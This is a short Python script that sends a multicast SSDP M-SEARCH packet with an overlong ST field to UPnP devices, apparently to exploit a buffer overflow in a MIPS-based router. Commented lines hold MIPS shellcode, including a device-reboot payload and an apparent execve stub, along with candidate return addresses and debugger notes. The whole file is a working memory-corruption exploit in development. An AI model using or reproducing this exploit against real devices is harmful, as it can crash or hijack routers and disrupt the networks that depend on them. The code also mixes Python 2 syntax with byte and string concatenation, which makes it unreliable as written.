import socket
import random
import select


rdstr = b''

#rdstr = b"\x3c\x06\x43\x21\x34\xc6\xfe\xdc\x3c\x05\x28\x12\x34\xa5\x19\x69\x3c\x04\xfe\xe1\x34\x84\xde\xad\x24\x02\x0f\xf8\x01\x01\x01\x0c"
#rdstr += b"\x3c\x06\x43\x21\x34\xc6\xfe\xdc\x3c\x05\x28\x12\x34\xa5\x19\x69\x3c\x04\xfe\xe1\x34\x84\xde\xad\x24\x02\x0f\xf8\x01\x01\x01\x0c"

#rdstr = b"\x3c\x1f\xff\x89\x37\x1f\x89\xd4\x28\x1f\x89\xd4\x40\x40\x40\x40\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41"
#rdstr = b"\x41\x41\x41\x41\x24\x06\x06\x66\x04\xd0\xff\xff\x28\x06\xff\xff\x27\xbd\xff\xe0\x27\xe4\x10\x01\x24\x84\xf0\x1f\xaf\xa4\xff\xe8\xaf\xa0\xff\xec\x27\xa5\xff\xe8\x24\x02\x0f\xab\x01\x01\x01\x0c\x2f\x62\x69\x6e"
for v in range(0,256):    #152
  rdstr += b"\x41"

#\\0x76ffee48 startbuff
#0x7689d4
#0x76896474


#b *0x76ffee4c


#reboot : \x3c\x06\x43\x21\x34\xc6\xfe\xdc\x3c\x05\x28\x12\x34\xa5\x19\x69\x3c\x04\xfe\xe1\x34\x84\xde\xad\x24\x02\x0f\xf8\x01\x01\x01\x0c

#rdstr += "ABCDEFGHIJKLMNOPQRSTU"

#rdstr += b"\x00\x76\x89\xd4"
#rdstr += b"\x76\xff\xee\x48"
#rdstr = "" 


UDP_IP = "239.255.255.250"
UDP_PORT = 1900
MESSAGE = "M-SEARCH * HTTP/1.1\r\n"\
	  "Host:239.255.255.250:1900\r\n"\
          "ST:\"uuid:schemas:device:" + rdstr + ":end\"\r\n"\
          "Man:\"ssdp:discover\"\r\n"\
          "MX:2\r\n\r\n"

print "UDP target IP:", UDP_IP
print "UDP target port:", UDP_PORT
#print "message:", MESSAGE

sock = socket.socket(socket.AF_INET, # Internet
                     socket.SOCK_DGRAM) # UDP

sock.bind(('0.0.0.0', 1444))
sock.setsockopt(socket.SOL_SOCKET, 25, 'ipoe0')
sock.sendto(MESSAGE, (UDP_IP, UDP_PORT))

ready = select.select([sock], [], [], 3)
if ready[0]:
    data =  sock.recv(10240)

stringdata = data.decode('utf-8')

print stringdata

